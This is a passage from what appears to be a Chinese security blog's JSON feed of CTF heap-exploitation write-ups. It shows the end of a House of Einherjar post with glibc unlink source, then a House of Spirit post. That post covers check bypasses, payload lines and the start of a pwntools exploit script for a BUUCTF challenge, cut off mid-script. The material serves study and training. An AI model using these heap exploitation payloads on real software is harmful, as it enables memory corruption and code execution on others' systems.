data-num=\"124\"></td><td><pre>it<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><blockquote>\n<p>参考:</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly94ei5hbGl5dW4uY29tL3QvNzI2Nj90aW1lX18xMzExPW40JTJCeG5EMER5N0clM0RCRXhCcW9vM0dRTEs3S2l0REJqRCUyQk9vRA==\">House of 系列堆漏洞详解 (一) - 先知社区 (aliyun.com)</span></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9yb2Rlcmlja2NoYW4uZ2l0aHViLmlvL3poLWNuLzIwMjMtMDItMjctaG91c2Utb2YtYWxsLWFib3V0LWdsaWJjLWhlYXAtZXhwbG9pdGF0aW9uLyMyMi1ob3VzZS1vZi1laW5oZXJqYXI=\">Glibc 堆利用之 house of 系列总结 - roderick - record and learn! (roderickchan.github.io)</span></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9jdGYtd2lraS5vcmcvcHduL2xpbnV4L3VzZXItbW9kZS9oZWFwL3B0bWFsbG9jMi9ob3VzZS1vZi1laW5oZXJqYXIv\">House Of Einherjar - CTF Wiki (ctf-wiki.org)</span></p>\n<p>[House Of Einherjar - 原理 | Pwn 进你的心 (<span class=\"exturl\" data-url=\"aHR0cDovL3l3aGtreC5naXRodWIuaW8=\">ywhkkx.github.io</span>)](<span class=\"exturl\" data-url=\"aHR0cHM6Ly95d2hra3guZ2l0aHViLmlvLzIwMjIvMDMvMDgvSG91c2U=\">https://ywhkkx.github.io/2022/03/08/House</span> Of Einherjar - 原理 /)</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuYW5xdWFua2UuY29tL3Bvc3QvaWQvMjUxNTk2\">PWN——House Of Einherjar CTF Wiki 例题详解 - 安全客 - 安全资讯平台 (anquanke.com)</span></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3ltczAyMTEvYXJ0aWNsZS9kZXRhaWxzLzEyNzA1MTMwNQ==\">2016 Seccon tinypad-CSDN 博客</span></p>\n</blockquote>\n<p>增文：</p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">/* consolidate backward */</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token function\">prev_inuse</span><span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>      prevsize <span class=\"token operator\">=</span> p<span class=\"token operator\">-></span>prev_size<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>      size <span class=\"token operator\">+=</span> prevsize<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>      p <span class=\"token operator\">=</span> <span class=\"token function\">chunk_at_offset</span><span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">,</span> <span class=\"token operator\">-</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">long</span><span class=\"token punctuation\">)</span> prevsize<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>      <span class=\"token function\">unlink</span><span class=\"token punctuation\">(</span>av<span class=\"token punctuation\">,</span> p<span class=\"token punctuation\">,</span> bck<span class=\"token punctuation\">,</span> fwd<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">define</span> <span class=\"token macro-name function\">unlink</span><span class=\"token expression\"><span class=\"token punctuation\">(</span>AV<span class=\"token punctuation\">,</span> P<span class=\"token punctuation\">,</span> BK<span class=\"token punctuation\">,</span> FD<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>                                            </span><span class=\"token punctuation\">\\</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    <span class=\"token expression\">FD <span class=\"token operator\">=</span> P<span class=\"token operator\">-></span>fd<span class=\"token punctuation\">;</span>\t\t\t\t\t\t\t\t      </span><span class=\"token punctuation\">\\</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    <span class=\"token expression\">BK <span class=\"token operator\">=</span> P<span class=\"token operator\">-></span>bk<span class=\"token punctuation\">;</span>\t\t\t\t\t\t\t\t      </span><span class=\"token punctuation\">\\</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    <span class=\"token expression\"><span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token function\">__builtin_expect</span> <span class=\"token punctuation\">(</span>FD<span class=\"token operator\">-></span>bk <span class=\"token operator\">!=</span> P <span class=\"token operator\">||</span> BK<span class=\"token operator\">-></span>fd <span class=\"token operator\">!=</span> P<span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\t\t      </span><span class=\"token punctuation\">\\</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>      <span class=\"token expression\"><span class=\"token function\">malloc_printerr</span> <span class=\"token punctuation\">(</span>check_action<span class=\"token punctuation\">,</span> </span><span class=\"token string\">\"corrupted double-linked list\"</span><span class=\"token expression\"><span class=\"token punctuation\">,</span> P<span class=\"token punctuation\">,</span> AV<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>  </span><span class=\"token punctuation\">\\</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>    <span class=\"token expression\"><span class=\"token keyword\">else</span> <span class=\"token punctuation\">&#123;</span>\t\t\t\t\t\t\t\t      </span><span class=\"token punctuation\">\\</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>        <span class=\"token expression\">FD<span class=\"token operator\">-></span>bk <span class=\"token operator\">=</span> BK<span class=\"token punctuation\">;</span>\t\t\t\t\t\t\t      </span><span class=\"token punctuation\">\\</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>        <span class=\"token expression\">BK<span class=\"token operator\">-></span>fd <span class=\"token operator\">=</span> FD<span class=\"token punctuation\">;</span>\t\t\t\t\t\t\t      </span><span class=\"token punctuation\">\\</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>        <span class=\"token expression\"><span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token function\">in_smallbin_range</span> <span class=\"token punctuation\">(</span>P<span class=\"token operator\">-></span>size<span class=\"token punctuation\">)</span>\t\t\t\t      </span><span class=\"token punctuation\">\\</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>            <span class=\"token expression\"><span class=\"token operator\">&amp;&amp;</span> <span class=\"token function\">__builtin_expect</span> <span class=\"token punctuation\">(</span>P<span class=\"token operator\">-></span>fd_nextsize <span class=\"token operator\">!=</span> <span class=\"token constant\">NULL</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\t\t      </span><span class=\"token punctuation\">\\</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>\t    <span class=\"token expression\"><span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token function\">__builtin_expect</span> <span class=\"token punctuation\">(</span>P<span class=\"token operator\">-></span>fd_nextsize<span class=\"token operator\">-></span>bk_nextsize <span class=\"token operator\">!=</span> P<span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span>\t      </span><span class=\"token punctuation\">\\</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>\t\t<span class=\"token expression\"><span class=\"token operator\">||</span> <span class=\"token function\">__builtin_expect</span> <span class=\"token punctuation\">(</span>P<span class=\"token operator\">-></span>bk_nextsize<span class=\"token operator\">-></span>fd_nextsize <span class=\"token operator\">!=</span> P<span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>    </span><span class=\"token punctuation\">\\</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>\t      <span class=\"token expression\"><span class=\"token function\">malloc_printerr</span> <span class=\"token punctuation\">(</span>check_action<span class=\"token punctuation\">,</span>\t\t\t\t      </span><span class=\"token punctuation\">\\</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>\t\t\t       <span class=\"token string\">\"corrupted double-linked list (not small)\"</span><span class=\"token expression\"><span class=\"token punctuation\">,</span>    </span><span class=\"token punctuation\">\\</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>\t\t\t       <span class=\"token expression\">P<span class=\"token punctuation\">,</span> AV<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\t\t\t\t\t      </span><span class=\"token punctuation\">\\</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>            <span class=\"token expression\"><span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>FD<span class=\"token operator\">-></span>fd_nextsize <span class=\"token operator\">==</span> <span class=\"token constant\">NULL</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\t\t\t\t      </span><span class=\"token punctuation\">\\</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>                <span class=\"token expression\"><span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>P<span class=\"token operator\">-></span>fd_nextsize <span class=\"token operator\">==</span> P<span class=\"token punctuation\">)</span>\t\t\t\t      </span><span class=\"token punctuation\">\\</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>                  <span class=\"token expression\">FD<span class=\"token operator\">-></span>fd_nextsize <span class=\"token operator\">=</span> FD<span class=\"token operator\">-></span>bk_nextsize <span class=\"token operator\">=</span> FD<span class=\"token punctuation\">;</span>\t\t      </span><span class=\"token punctuation\">\\</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>                <span class=\"token expression\"><span class=\"token keyword\">else</span> <span class=\"token punctuation\">&#123;</span>\t\t\t\t\t\t\t      </span><span class=\"token punctuation\">\\</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>                    <span class=\"token expression\">FD<span class=\"token operator\">-></span>fd_nextsize <span class=\"token operator\">=</span> P<span class=\"token operator\">-></span>fd_nextsize<span class=\"token punctuation\">;</span>\t\t\t      </span><span class=\"token punctuation\">\\</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>                    <span class=\"token expression\">FD<span class=\"token operator\">-></span>bk_nextsize <span class=\"token operator\">=</span> P<span class=\"token operator\">-></span>bk_nextsize<span class=\"token punctuation\">;</span>\t\t\t      </span><span class=\"token punctuation\">\\</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>                    <span class=\"token expression\">P<span class=\"token operator\">-></span>fd_nextsize<span class=\"token operator\">-></span>bk_nextsize <span class=\"token operator\">=</span> FD<span class=\"token punctuation\">;</span>\t\t\t      </span><span class=\"token punctuation\">\\</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>                    <span class=\"token expression\">P<span class=\"token operator\">-></span>bk_nextsize<span class=\"token operator\">-></span>fd_nextsize <span class=\"token operator\">=</span> FD<span class=\"token punctuation\">;</span>\t\t\t      </span><span class=\"token punctuation\">\\</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>                  <span class=\"token expression\"><span class=\"token punctuation\">&#125;</span>\t\t\t\t\t\t\t      </span><span class=\"token punctuation\">\\</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>              <span class=\"token expression\"><span class=\"token punctuation\">&#125;</span> <span class=\"token keyword\">else</span> <span class=\"token punctuation\">&#123;</span>\t\t\t\t\t\t\t      </span><span class=\"token punctuation\">\\</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>                <span class=\"token expression\">P<span class=\"token operator\">-></span>fd_nextsize<span class=\"token operator\">-></span>bk_nextsize <span class=\"token operator\">=</span> P<span class=\"token operator\">-></span>bk_nextsize<span class=\"token punctuation\">;</span>\t\t      </span><span class=\"token punctuation\">\\</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>                <span class=\"token expression\">P<span class=\"token operator\">-></span>bk_nextsize<span class=\"token operator\">-></span>fd_nextsize <span class=\"token operator\">=</span> P<span class=\"token operator\">-></span>fd_nextsize<span class=\"token punctuation\">;</span>\t\t      </span><span class=\"token punctuation\">\\</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>              <span class=\"token expression\"><span class=\"token punctuation\">&#125;</span>\t\t\t\t\t\t\t\t      </span><span class=\"token punctuation\">\\</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>          <span class=\"token expression\"><span class=\"token punctuation\">&#125;</span>\t\t\t\t\t\t\t\t      </span><span class=\"token punctuation\">\\</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>      <span class=\"token expression\"><span class=\"token punctuation\">&#125;</span>\t\t\t\t\t\t\t\t\t      </span><span class=\"token punctuation\">\\</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre><span class=\"token expression\"><span class=\"token punctuation\">&#125;</span></span></span></pre></td></tr></table></figure><blockquote>\n<p>个人人为此次攻击利用和攻击面上都比较大</p>\n</blockquote>\n",
            "tags": [
                "house系列",
                "house-of-einherjar"
            ]
        },
        {
            "id": "https://yhuanhuan01.github.io/2024/07/12/house-of-spirit/",
            "url": "https://yhuanhuan01.github.io/2024/07/12/house-of-spirit/",
            "title": "house-of-spirit",
            "date_published": "2024-07-12T01:18:27.000Z",
            "content_html": "<h1 id=\"house-of-spirit\"><a class=\"markdownIt-Anchor\" href=\"#house-of-spirit\">#</a> house-of-spirit</h1>\n<p>漏洞成因</p>\n<blockquote>\n<p>堆溢出写</p>\n</blockquote>\n<p>适用范围</p>\n<blockquote>\n<ul>\n<li><code>2.23</code> —— 至今</li>\n</ul>\n</blockquote>\n<h3 id=\"概要\"><a class=\"markdownIt-Anchor\" href=\"#概要\">#</a> 概要：</h3>\n<p>该技术的核心在于在目标位置处伪造 fastbin chunk，并将其释放，从而达到分配指定地址的 chunk 的目的。</p>\n<h3 id=\"绕过检测\"><a class=\"markdownIt-Anchor\" href=\"#绕过检测\">#</a> 绕过检测：</h3>\n<ul>\n<li>fake chunk 的 ISMMAP 位不能为 1, 因为 free 时，如果是 mmap 的 chunk, 会单独处理</li>\n<li>fake chunk 地址需要对齐， MALLOC_ALIGN_MASK</li>\n<li>fake chunk 的 size 大小需要满足对应的 fastbin 的需求，同时也得对齐</li>\n<li>fake chunk 的 next chunk 的大小不能小于 2 * SIZE_SZ，同时也不能大于 av-&gt;system_mem</li>\n<li>fake chunk 对应的 fastbin 链表头部不能是该 fake chunk，即不能构成 double free 的情况</li>\n</ul>\n<h3 id=\"利用思路\"><a class=\"markdownIt-Anchor\" href=\"#利用思路\">#</a> 利用思路：</h3>\n<p>one:</p>\n<ul>\n<li>申请  <code>chunk A、chunk B、chunk C、chunk D</code></li>\n<li>对  <code>A</code>  写操作的时候溢出，修改  <code>B</code>  的  <code>size</code>  域，使其能包括  <code>chunk C</code></li>\n<li>释放  <code>B</code> ，然后把  <code>B</code>  申请回来，再释放  <code>C</code> ，则可以通过读写  <code>B</code>  来控制  <code>C</code>  的内容</li>\n</ul>\n<p>two:</p>\n<ul>\n<li>\n<p>在栈中构造 fake chunk，大小覆盖掉函数的返回地址，再次分配得到返回地址控制，写入 one_gadget 或者 shellcode 地址。</p>\n</li>\n<li>\n<p>注意如果构造 fastbin，free 函数会检测 next chunk 的大小与当前的 fake chunk 大小是否一致，需要绕过！</p>\n</li>\n</ul>\n<p>three:</p>\n<ul>\n<li>\n<p>伪造堆块：在可控的两个堆块构造好数据，将它伪造成一个 fastbin</p>\n</li>\n<li>\n<p>覆盖堆指针指向上一步伪造的堆块</p>\n</li>\n<li>\n<p>释放堆块，将伪造的堆块释放入 fastbin 的单链表里面</p>\n</li>\n<li>\n<p>申请堆块，将刚刚释放的堆块申请出来，最终使得可以往目标区域中写入数据，实现目的</p>\n</li>\n</ul>\n<h3 id=\"例题\"><a class=\"markdownIt-Anchor\" href=\"#例题\">#</a> 例题：</h3>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9idXVvai5jbi9jaGFsbGVuZ2VzI2xjdGYyMDE2X3B3bjIwMA==\">BUUCTF 在线评测 (buuoj.cn)</span></p>\n<p><img data-src=\"/img/house-of-spirit/image-20240711205503306.png\" alt=\"image-20240711205503306\"></p>\n<p>存在 rwx，可以在栈上放 shellcode</p>\n<p><img data-src=\"/img/house-of-spirit/image-20240711213614053.png\" alt=\"image-20240711213614053\"></p>\n<p>可以泄露 rbp</p>\n<p><img data-src=\"/img/house-of-spirit/image-20240711210319465.png\" alt=\"image-20240711210319465\"></p>\n<p><img data-src=\"/img/house-of-spirit/image-20240711211709494.png\" alt=\"image-20240711211709494\"></p>\n<p>存在溢出，buf 可以溢出到 dest 变量</p>\n<blockquote>\n<p>写之前</p>\n</blockquote>\n<p><img data-src=\"/img/house-of-spirit/image-20240711214315664.png\" alt=\"image-20240711214315664\"></p>\n<blockquote>\n<p>写之后</p>\n</blockquote>\n<p><img data-src=\"/img/house-of-spirit/image-20240711214405880.png\" alt=\"image-20240711214405880\"></p>\n<p><img data-src=\"/img/house-of-spirit/image-20240711205554791.png\" alt=\"image-20240711205554791\"></p>\n<p>只能去申请 0-0x80 大小的 chunk。可以看到 ptr 会被再次申请回来。而 dele 可以去 free 之前的 ptr。</p>\n<p>所以我们可以去覆写 ptr，从而劫持返回地址，写入 shellcode 即可。</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>pl <span class=\"token operator\">=</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token operator\">*</span><span class=\"token number\">4</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0x51</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>rbp<span class=\"token operator\">-</span><span class=\"token number\">0x98</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p>伪造 fake_chunk—— 可惜这样并不行。</p>\n<p>原因：堆是向高地址生长的，而栈是有低地址生长的</p>\n<blockquote>\n<p>pl = p64(0) + p64(0x61) + p64(0) + p64(0) + p64(0) + p64(0)*2 + p64(rbp-0xb0)</p>\n</blockquote>\n<p>注意：一样要注意再次 malloc 时堆块的大小，否则此检查不过</p>\n<blockquote>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>fail <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token function\">chunksize_nomask</span> <span class=\"token punctuation\">(</span><span class=\"token function\">chunk_at_offset</span> <span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">,</span> size<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&lt;=</span> <span class=\"token number\">2</span> <span class=\"token operator\">*</span> SIZE_SZ</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>\t\t    <span class=\"token operator\">||</span> <span class=\"token function\">chunksize</span> <span class=\"token punctuation\">(</span><span class=\"token function\">chunk_at_offset</span> <span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">,</span> size<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">>=</span> av<span class=\"token operator\">-></span>system_mem<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>\t    <span class=\"token function\">__libc_lock_unlock</span> <span class=\"token punctuation\">(</span>av<span class=\"token operator\">-></span>mutex<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>\t  <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>\t<span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>fail<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>\t  <span class=\"token function\">malloc_printerr</span> <span class=\"token punctuation\">(</span><span class=\"token string\">\"free(): invalid next size (fast)\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure></blockquote>\n<h3 id=\"完整exp\"><a class=\"markdownIt-Anchor\" href=\"#完整exp\">#</a> 完整 exp:</h3>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token triple-quoted-string string\">'''</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>huan_attack_pwn</pre></td></tr><tr><td data-num=\"3\"></td><td><pre>'''</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">import</span> sys</pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token comment\"># from LibcSearcher import *</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token comment\"># from ctypes import *</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>context<span class=\"token punctuation\">(</span>arch<span class=\"token operator\">=</span><span class=\"token string\">'amd64'</span><span class=\"token punctuation\">,</span> os<span class=\"token operator\">=</span><span class=\"token string\">'linux'</span><span class=\"token punctuation\">,</span> log_level<span class=\"token operator\">=</span><span class=\"token string\">'debug'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token comment\"># context(arch='i386' , os='linux', log_level='debug')</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>binary <span class=\"token operator\">=</span> <span class=\"token string\">'./pwn'</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>libc <span class=\"token operator\">=</span> <span class=\"token string\">'./pwn'</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token comment\"># host, port = \":\".split(\":\")</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token string\">'\\033[31;40mremote\\033[0m: (y)\\n'</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    <span class=\"token string\">'\\033[32;40mprocess\\033[0m: (n)'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre></pre></td></tr><tr><td data-num=\"18\"></td><td><pre><span class=\"token keyword\">if</span> sys<span class=\"token punctuation\">.</span>argv<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">==</span> <span class=\"token string\">'y'</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>    r <span class=\"token operator\">=</span> remote<span class=\"token punctuation\">(</span>host<span class=\"token punctuation\">,</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>port<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre><span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>    r <span class=\"token operator\">=</span> process<span class=\"token punctuation\">(</span>binary<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre></pre></td></tr><tr><td data-num=\"23\"></td><td><pre><span class=\"token comment\"># r = gdb.debug(binary)</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre><span class=\"token comment\"># libc = cdll.LoadLibrary(libc)</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre><span class=\"token comment\"># libc = ELF(libc)</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre><span class=\"token comment\"># elf = ELF(binary)</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre><span class=\"token comment\"># srand = libc.srand (libc.time (0)) #设置种子</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>default <span class=\"token operator\">=</span> <span class=\"token number\">1</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>se      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> data                     <span class=\"token punctuation\">:</span> r<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>sa      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> delim<span class=\"token punctuation\">,</span> data              <span class=\"token punctuation\">:</span> r<span class=\"token punctuation\">.</span>sendafter<span class=\"token punctuation\">(</span>delim<span class=\"token punctuation\">,</span> data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>sl      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> data                     <span class=\"token punctuation\">:</span> r<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>sla     <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> delim<span class=\"token punctuation\">,</span> data              <span class=\"token punctuation\">:</span> r<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span>delim<span class=\"token punctuation\">,</span> data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>rc      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> numb<span class=\"token operator\">=</span><span class=\"token number\">4096</span>                <span class=\"token punctuation\">:</span> r<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span>numb<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>rl      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> time<span class=\"token operator\">=</span>default             <span class=\"token punctuation\">:</span> r<span class=\"token punctuation\">.</span>recvline<span class=\"token punctuation\">(</span>timeout<span class=\"token operator\">=</span>time<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>ru      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> delims<span class=\"token punctuation\">,</span> time<span class=\"token operator\">=</span>default     <span class=\"token punctuation\">:</span> r<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span>delims<span class=\"token punctuation\">,</span>timeout<span class=\"token operator\">=</span>time<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>rpu     <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> delims<span class=\"token punctuation\">,</span> time<span class=\"token operator\">=</span>default     <span class=\"token punctuation\">:</span> r<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span>delims<span class=\"token punctuation\">,</span>timeout<span class=\"token operator\">=</span>time<span class=\"token punctuation\">,</span>drop<span class=\"token operator\">=</span><span class=\"token boolean\">True</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>uu32    <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> data                     <span class=\"token punctuation\">:</span> u32<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">4</span><span class=\"token punctuation\">,</span> <span class=\"token string\">b'\\0'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>uu64    <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> data                     <span class=\"token punctuation\">:</span> u64<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">,</span> <span class=\"token string\">b'\\0'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>lic     <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> data                     <span class=\"token punctuation\">:</span> uu64<span class=\"token punctuation\">(</span>ru<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">-</span><span class=\"token number\">6</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>padding <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> length                   <span class=\"token punctuation\">:</span> <span class=\"token string\">b'Yhuan'</span> <span class=\"token operator\">*</span> <span class=\"token punctuation\">(</span>length <span class=\"token operator\">//</span> <span class=\"token number\">5</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token string\">b'Y'</span> <span class=\"token operator\">*</span> <span class=\"token punctuation\">(</span>length <span class=\"token operator\">%</span> <span class=\"token 